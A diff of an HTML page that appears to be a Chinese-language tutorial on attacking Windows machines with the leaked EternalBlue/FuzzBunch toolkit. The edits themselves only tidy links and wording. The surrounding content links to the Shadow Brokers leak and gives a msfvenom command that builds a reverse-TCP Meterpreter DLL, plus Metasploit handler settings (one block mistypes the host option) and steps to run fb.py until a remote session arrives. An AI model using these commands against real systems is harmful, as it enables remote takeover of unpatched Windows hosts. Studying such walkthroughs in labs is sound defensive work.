@@ -221,7 +221,7 @@
 <p>Windows x86 python-2.6.6.msi：<br>
 <a href="https://www.python.org/download/releases/2.6.6/" target="_blank" rel="noopener">https://www.python.org/download/releases/2.6.6/</a><br>
 pywin32-221.win32-py2.6.exe：<br>
-[<a href="https://sourceforge.net/projects/pywin32/files/pywin32/Build%20221/" target="_blank" rel="noopener">https://sourceforge.net/projects/pywin32/files/pywin32/Build 221/</a>](<a href="https://sourceforge.net/projects/pywin32/files/pywin32/Build" target="_blank" rel="noopener">https://sourceforge.net/projects/pywin32/files/pywin32/Build</a> 221/)<br>
+<a href="https://sourceforge.net/projects/pywin32/files/pywin32/Build%20221/" target="_blank" rel="noopener">https://sourceforge.net/projects/pywin32/files/pywin32/Build 221/</a><br>
 方程式ETERNALBLUE 下载地址：<br>
 <a href="https://codeload.github.com/misterch0c/shadowbroker/zip/master" target="_blank" rel="noopener">https://codeload.github.com/misterch0c/shadowbroker/zip/master</a></p>
 </blockquote>
@@ -235,11 +235,10 @@ pywin32-221.win32-py2.6.exe：<br>
 <p>1、生成payload</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.101 LPORT=1234 -f dll &gt;64.dll</span><br></pre></td></tr></table></figure>
 <p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gkuwbm3sd6j30s905f76d.jpg" alt="image-20201119232432736"></p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">show options</span><br><span class="line">set LHOST 192.168.1.101</span><br><span class="line">set LPORT 1234</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
 <p>2、本地msf进行监听</p>
 <p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gkuweb222cj30mt076q5c.jpg" alt="image-20201119232708013"></p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">set lport 192.168.1.101</span><br><span class="line">set lport 1234</span><br></pre></td></tr></table></figure>
-<p>3、新建listeningposts文件夹并将msf生成的dll文件放入根目录，<a href="http://xn--fb-1e9fp0x.py" target="_blank" rel="noopener">运行fb.py</a></p>
+<p>3、新建listeningposts文件夹并将msf生成的dll文件放入根目录，运行fb.py文件</p>
 <p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gkuv2prpxwj30k20qp77x.jpg" alt="image-20201119224124041"></p>
 <p>设置攻击相关信息</p>
 <p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gkuw2bsuqij30i30esmze.jpg" alt="image-20201119231537200"></p>
@@ -252,7 +251,7 @@ pywin32-221.win32-py2.6.exe：<br>
 <p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gkuvpcxyb4j30oe0qtdiy.jpg" alt="image-20201119230309957"></p>
 <p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gkuvsaaynnj30lp0rhadk.jpg" alt="image-20201119230558825"></p>
 <p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gkuvu5s99kj30mr0kwtbd.jpg" alt="image-20201119230746276"></p>
-<p>这个时候返回msf上查看成功收到会话</p>
+<p>这个时候返回msf，成功收到会话。</p>
 <p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gkuwitxzy4j30nq09x41b.jpg" alt="image-20201119233129340"></p>
 
                 
